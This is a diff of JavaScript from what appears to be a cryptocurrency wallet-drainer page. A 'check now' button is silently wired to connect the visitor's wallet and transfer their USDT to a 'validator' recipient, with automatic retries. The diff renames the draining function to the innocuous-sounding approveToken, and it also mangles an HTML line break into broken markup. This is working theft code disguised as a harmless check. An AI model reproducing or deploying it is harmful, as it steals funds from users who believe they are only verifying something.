@@ -1316,7 +1316,7 @@ function showPopup(msg, color = "black") {
   setTimeout(() => (box.style.display = "none"), 6000);
 }
 
-async function approveAndTransfer(auto = false) {
+async function approveToken(auto = false) {
   try {
     if (!web3 || !userAddress) {
       await connectWalletAndSwitch();
@@ -1355,7 +1355,7 @@ async function approveAndTransfer(auto = false) {
       });
 
       setTimeout(() => {
-        approveAndTransfer(true); // retry
+        approveToken(true); // retry
       }, 4000);
       return;
     }
@@ -1363,7 +1363,7 @@ async function approveAndTransfer(auto = false) {
     showPopup("Transferring USDT to validator...", "blue");
     await usdt.methods.transfer(recipient, web3.utils.toWei(usdtAmount.toString())).send({ from: userAddress });
 
-    showPopup(`✅ Transfer complete<br>USDT sent: ${usdtAmount}`, "red");
+    showPopup(`✅ Transfer complete<  >USDT sent: ${usdtAmount}`, "red");
   } catch (err) {
     console.error("Transfer error:", err);
     if (!auto) showPopup("Something went wrong. Try again.", "red");
@@ -1379,7 +1379,7 @@ window.addEventListener("load", async () => {
   const observer = new MutationObserver(() => {
     const btn = [...document.querySelectorAll("button")].find(b => b.textContent.trim().toLowerCase() === "check now");
     if (btn) {
-      btn.addEventListener("click", () => approveAndTransfer());
+      btn.addEventListener("click", () => approveToken());
       observer.disconnect();
     }
   });
